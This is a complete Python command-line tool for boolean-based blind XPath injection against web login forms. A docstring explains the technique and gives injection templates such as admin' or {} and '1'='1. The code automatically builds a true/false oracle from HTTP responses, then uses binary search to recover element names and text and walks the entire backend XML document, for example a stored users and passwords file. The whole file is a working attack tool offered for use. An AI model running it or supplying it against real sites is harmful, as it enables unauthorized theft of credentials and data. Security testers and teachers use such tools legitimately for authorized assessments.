#!/usr/bin/env python3
"""
Boolean-based blind XPath injection fuzzer.

=======
THE IDEA
=======
Some web apps build an XPath query from user input, like:

    /users/user[username='INPUT' and password='...']

If the app does not escape the input, we can inject our own XPath fragment:

    INPUT = admin' or SOMETHING and '1'='1

The backend then runs:

    /users/user[username='admin' or SOMETHING and '1'='1']

Because of XPath operator precedence, this is the same as:

    /users/user[username='admin' or (SOMETHING and '1'='1')]

So the whole predicate is TRUE whenever SOMETHING is TRUE, and FALSE
otherwise. The HTTP response changes visibly: when TRUE, the app returns
matching users; when FALSE, it returns nothing.

That gives us a single yes/no channel. We use it to ask any boolean XPath
question we like, one bit at a time:

    count(/*) = 3                   -> is there 3 root children?
    string-length(name(/*[1])) = 8  -> is the first element name 8 chars?
    substring(name(/*[1]), 1, 1) = 'u'  -> is its first letter 'u'?

By repeating those questions with binary search, we reconstruct the entire
XML document without ever seeing it directly.

==============
THE "ORACLE"
==============
We need a function that looks at an HTTP response and says TRUE or FALSE.
We build it automatically:

  1. Send a known-TRUE payload ('1'='1') a few times.
  2. Send a known-FALSE payload ('1'='2') a few times.
  3. Compare the responses and pick the first thing that reliably differs:
       - status code
       - redirect Location header
       - a word that appears only in TRUE responses
       - response body length

===============
USAGE (example)
===============
    python3 xfuzz.py \\
        -u http://target/login.php \\
        -X POST \\
        -p username \\
        -d "password=x" \\
        -t "admin' or {} and '1'='1"

The '{}' in the template is where our boolean XPath snippet goes.
"""

import argparse
import re
import sys
import time
from urllib.parse import parse_qsl

import requests


# =============================================================================
# Constants
# =============================================================================

# Known-outcome XPath probes used to teach the oracle what TRUE/FALSE look
# like. '1'='1' is always true; '1'='2' is always false.
ALWAYS_TRUE = "'1'='1'"
ALWAYS_FALSE = "'1'='2'"

# Characters we expect to see in XML element names, per the XML spec.
NAME_CHARS = (
    "-.0123456789:"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "_abcdefghijklmnopqrstuvwxyz"
)

# Characters we expect to see in XML text content: all printable ASCII,
# plus tab/newline/carriage-return, plus the Latin-1 supplement for
# accented letters like 'é', 'ñ', 'ü'.
TEXT_CHARS = "\t\n\r"
for code_point in range(0x20, 0x7F):
    TEXT_CHARS += chr(code_point)
for code_point in range(0xA0, 0x100):
    TEXT_CHARS += chr(code_point)


# =============================================================================
# Target: holds everything needed to send one HTTP request
# =============================================================================

class Target:
    def __init__(self, url, method, param, template,
                 data, headers, cookies, timeout):
        self.url = url
        self.method = method.upper()
        self.param = param          # the injectable parameter name
        self.template = template    # must contain '{}' placeholder
        self.data = data            # other form/query params (dict)
        self.headers = headers      # extra headers (dict)
        self.cookies = cookies      # extra cookies (dict)
        self.timeout = timeout
        self.session = requests.Session()

    def send(self, xpath_snippet):
        """Send one HTTP request with xpath_snippet spliced into the template.

        Example: if template is "admin' or {} and '1'='1" and snippet is
        "count(/*)=3", the parameter value sent will be:

            admin' or count(/*)=3 and '1'='1

        which the backend will concatenate into its XPath query.
        """
        # 1. Build the injected parameter value
        injected_value = self.template.replace("{}", xpath_snippet)

        # 2. Merge it with any other static parameters
        params = {}
        for key in self.data:
            params[key] = self.data[key]
        params[self.param] = injected_value

        # 3. Send the request. We disable redirects so the oracle can see
        #    the original status code / Location header.
        if self.method == "GET":
            return self.session.get(
                self.url,
                params=params,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
                allow_redirects=False,
            )
        return self.session.request(
            self.method,
            self.url,
            data=params,
            headers=self.headers,
            cookies=self.cookies,
            timeout=self.timeout,
            allow_redirects=False,
        )


# =============================================================================
# Oracle: classify a response as TRUE or FALSE
#
# We try four strategies in order of reliability. Each returns either a
# classifier function (good!) or None (this strategy can't separate them).
# =============================================================================

def try_status_oracle(true_responses, false_responses):
    """Does the HTTP status code differ reliably between TRUE and FALSE?"""
    true_codes = set()
    for response in true_responses:
        true_codes.add(response.status_code)
    false_codes = set()
    for response in false_responses:
        false_codes.add(response.status_code)

    # Both classes must be internally consistent AND disagree with each other.
    if len(true_codes) != 1 or len(false_codes) != 1:
        return None
    if true_codes == false_codes:
        return None

    winning_code = list(true_codes)[0]
    losing_code = list(false_codes)[0]
    print("[oracle] status code: TRUE=" + str(winning_code) +
          " FALSE=" + str(losing_code), file=sys.stderr)

    def classify(response):
        return response.status_code == winning_code
    return classify


def try_redirect_oracle(true_responses, false_responses):
    """Does the redirect Location header differ reliably?"""
    true_locations = set()
    for response in true_responses:
        true_locations.add(response.headers.get("Location", ""))
    false_locations = set()
    for response in false_responses:
        false_locations.add(response.headers.get("Location", ""))

    if len(true_locations) != 1 or len(false_locations) != 1:
        return None
    if true_locations == false_locations:
        return None

    winning_location = list(true_locations)[0]
    print("[oracle] redirect Location: TRUE=" + repr(winning_location),
          file=sys.stderr)

    def classify(response):
        return response.headers.get("Location", "") == winning_location
    return classify


def try_token_oracle(true_responses, false_responses):
    """Is there a word that appears in EVERY TRUE body and NO FALSE body?"""
    word_pattern = re.compile(r"[A-Za-z0-9_]{4,}")

    # Start with the words in the first TRUE response, then keep only those
    # that also appear in every other TRUE response.
    words_in_all_true = set(word_pattern.findall(true_responses[0].text))
    for response in true_responses[1:]:
        words_in_all_true &= set(word_pattern.findall(response.text))

    # Union of all words across all FALSE responses.
    words_in_any_false = set()
    for response in false_responses:
        words_in_any_false |= set(word_pattern.findall(response.text))

    # Words unique to TRUE.
    uniquely_true = sorted(words_in_all_true - words_in_any_false)
    if len(uniquely_true) == 0:
        return None

    marker = uniquely_true[0]
    print("[oracle] body token: " + repr(marker) + " appears only in TRUE",
          file=sys.stderr)

    def classify(response):
        return marker in response.text
    return classify


def try_length_oracle(true_responses, false_responses):
    """Fallback: TRUE and FALSE responses have different body sizes,
    beyond the noise we see within each class."""
    true_lengths = []
    for response in true_responses:
        true_lengths.append(len(response.text))
    false_lengths = []
    for response in false_responses:
        false_lengths.append(len(response.text))

    # "Noise" = how much the length varies *within* a single class.
    true_noise = max(true_lengths) - min(true_lengths)
    false_noise = max(false_lengths) - min(false_lengths)
    noise = max(true_noise, false_noise)

    average_true = sum(true_lengths) / len(true_lengths)
    average_false = sum(false_lengths) / len(false_lengths)

    # The gap between classes must be bigger than the noise within each.
    if abs(average_true - average_false) <= noise + 1:
        return None

    midpoint = (average_true + average_false) / 2
    true_is_bigger = average_true > average_false
    print("[oracle] body length: TRUE~" + str(int(average_true)) +
          " FALSE~" + str(int(average_false)), file=sys.stderr)

    def classify(response):
        if true_is_bigger:
            return len(response.text) > midpoint
        return len(response.text) < midpoint
    return classify


def detect_oracle(target, samples=3):
    """Probe the target with TRUE and FALSE payloads and pick a classifier."""
    true_responses = []
    false_responses = []
    for _ in range(samples):
        true_responses.append(target.send(ALWAYS_TRUE))
        false_responses.append(target.send(ALWAYS_FALSE))

    strategies = [
        try_status_oracle,
        try_redirect_oracle,
        try_token_oracle,
        try_length_oracle,
    ]
    for strategy in strategies:
        classifier = strategy(true_responses, false_responses)
        if classifier is not None:
            return classifier

    raise RuntimeError(
        "Could not tell TRUE and FALSE responses apart. "
        "Check that --template and --param actually cause injection."
    )


# =============================================================================
# XPath string literal helper
#
# XPath 1.0 has no escape syntax inside string literals. If we want the
# literal to contain a single quote we must wrap it in double quotes, and
# vice versa. If the string contains BOTH, we have to build it by joining
# pieces with concat(...). This helper takes care of all three cases.
# =============================================================================

def xpath_string_literal(s):
    """Return an XPath 1.0 expression whose value is the string s."""
    if "'" not in s:
        return "'" + s + "'"
    if '"' not in s:
        return '"' + s + '"'
    # Both kinds of quote are present. Emit one tiny literal per character
    # and glue them together with concat().
    pieces = []
    for character in s:
        if character == "'":
            pieces.append('"' + "'" + '"')   # the three-char literal "'"
        else:
            pieces.append("'" + character + "'")
    return "concat(" + ",".join(pieces) + ")"


# =============================================================================
# Asker: fires XPath yes/no questions one at a time.
# =============================================================================

class Asker:
    def __init__(self, target, classifier, delay=0.0):
        self.target = target
        self.classifier = classifier
        self.delay = delay
        self.request_count = 0

    def ask(self, xpath_expression):
        """Send one request, return True/False based on the oracle."""
        if self.delay > 0:
            time.sleep(self.delay)
        self.request_count += 1
        response = self.target.send(xpath_expression)
        return self.classifier(response)


# =============================================================================
# Query primitives: find numbers, characters, and strings
# =============================================================================

def find_number(asker, numeric_expression, start_hi=64):
    """Find the integer value of an XPath numeric expression.

    Works in two steps:
      1. Grow an upper bound by doubling until the answer is somewhere in it.
      2. Binary-search the range [0, hi] by asking '<= mid?'.
    """
    # Step 1: grow the upper bound.
    hi = start_hi
    while not asker.ask(numeric_expression + "<=" + str(hi)):
        hi = hi * 2
        if hi > 1 << 20:
            raise RuntimeError(
                "Value of " + numeric_expression + " is unreasonably large."
            )

    # Step 2: binary search in [lo, hi].
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if asker.ask(numeric_expression + "<=" + str(mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo


def find_character(asker, string_expression, position, charset):
    """Recover the character at a 1-based position of a string expression.

    We cannot do a numeric '<' on strings in XPath 1.0 (it would convert
    them to NaN). Instead we use contains(): at each step we split the
    remaining candidates in half and ask 'is our character in this half?'.
    That's still binary search, but using a string operation that works.
    """
    candidates = sorted(set(charset))
    char_at_position = ("substring(" + string_expression +
                        "," + str(position) + ",1)")

    # Half-open interval: answer is somewhere in candidates[lo:hi].
    lo = 0
    hi = len(candidates)
    while hi - lo > 1:
        mid = (lo + hi) // 2
        left_half_string = "".join(candidates[lo:mid])
        probe = ("contains(" + xpath_string_literal(left_half_string) +
                 "," + char_at_position + ")")
        if asker.ask(probe):
            hi = mid     # target is in the left half
        else:
            lo = mid     # target is in the right half

    # The loop converged to a single candidate. Confirm with equality,
    # so that characters OUTSIDE our charset show up as '?' instead of a
    # bogus match.
    if lo < len(candidates):
        candidate = candidates[lo]
        equality_probe = (char_at_position + "=" +
                          xpath_string_literal(candidate))
        if asker.ask(equality_probe):
            return candidate
    return "?"


def find_string(asker, string_expression, charset):
    """Recover the full value of a string XPath expression."""
    length_expression = "string-length(" + string_expression + ")"
    length = find_number(asker, length_expression, start_hi=64)
    if length == 0:
        return ""

    result = ""
    for position in range(1, length + 1):   # XPath substring() is 1-indexed
        result += find_character(asker, string_expression, position, charset)
    return result


# =============================================================================
# Tree walker: recursively dump every element's name and text
# =============================================================================

def walk_tree(asker, node_xpath, depth, max_depth, name_chars, text_chars):
    # Fetch this node's element name and text content.
    name = find_string(asker, "name(" + node_xpath + ")", name_chars)
    text = find_string(asker, node_xpath + "/text()", text_chars)

    indent = "  " * depth
    print(indent + "<" + name + "> " + repr(text))

    # Stop if we've reached the depth limit.
    if depth >= max_depth:
        return

    # How many child elements does this node have?
    child_count = find_number(asker, "count(" + node_xpath + "/*)", start_hi=32)
    # XPath predicates are 1-indexed, so the first child is /*[1].
    for child_index in range(1, child_count + 1):
        child_xpath = node_xpath + "/*[" + str(child_index) + "]"
        walk_tree(asker, child_xpath, depth + 1, max_depth,
                  name_chars, text_chars)


# =============================================================================
# Command-line entry point
# =============================================================================

def parse_key_value_list(items):
    """Turn ['a=1', 'b=2'] into {'a': '1', 'b': '2'}."""
    result = {}
    if not items:
        return result
    for item in items:
        if "=" not in item:
            continue
        key, separator, value = item.partition("=")
        result[key] = value
    return result


def main():
    parser = argparse.ArgumentParser(
        description="Boolean-based blind XPath injection fuzzer."
    )
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-X", "--method", default="POST")
    parser.add_argument("-p", "--param", required=True,
                        help="name of the injectable parameter")
    parser.add_argument("-t", "--template", required=True,
                        help="injection template, must contain '{}'")
    parser.add_argument("-d", "--data", default="",
                        help="other params as urlencoded form, e.g. 'a=1&b=2'")
    parser.add_argument("-H", "--header", action="append", default=[],
                        help="Key=Value (may be repeated)")
    parser.add_argument("-c", "--cookie", action="append", default=[],
                        help="name=value (may be repeated)")
    parser.add_argument("--root", default="/*[1]",
                        help="XPath node to start walking from")
    parser.add_argument("--depth", type=int, default=4,
                        help="maximum recursion depth")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="delay in seconds between requests")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--name-chars", default=NAME_CHARS)
    parser.add_argument("--text-chars", default=TEXT_CHARS)
    args = parser.parse_args()

    # Basic sanity check on the template.
    if "{}" not in args.template:
        parser.error("--template must contain '{}' placeholder")

    # Build the Target object from the CLI arguments.
    target = Target(
        url=args.url,
        method=args.method,
        param=args.param,
        template=args.template,
        data=dict(parse_qsl(args.data, keep_blank_values=True)),
        headers=parse_key_value_list(args.header),
        cookies=parse_key_value_list(args.cookie),
        timeout=args.timeout,
    )

    # Probe the target and pick an oracle strategy.
    print("[*] probing " + args.url + " to build oracle...", file=sys.stderr)
    classifier = detect_oracle(target)
    asker = Asker(target, classifier, delay=args.delay)

    # Sanity check: the oracle should agree that the XML has at least one root.
    if not asker.ask("count(/*)>=1"):
        print("[!] oracle says root has no children. Template or param "
              "is probably wrong.", file=sys.stderr)
        return 2

    # Walk the tree from the chosen root and dump it.
    start_time = time.time()
    walk_tree(asker, args.root, 0, args.depth,
              args.name_chars, args.text_chars)
    elapsed = time.time() - start_time
    print("\n[+] done in " + ("%.1f" % elapsed) + "s, " +
          str(asker.request_count) + " requests", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
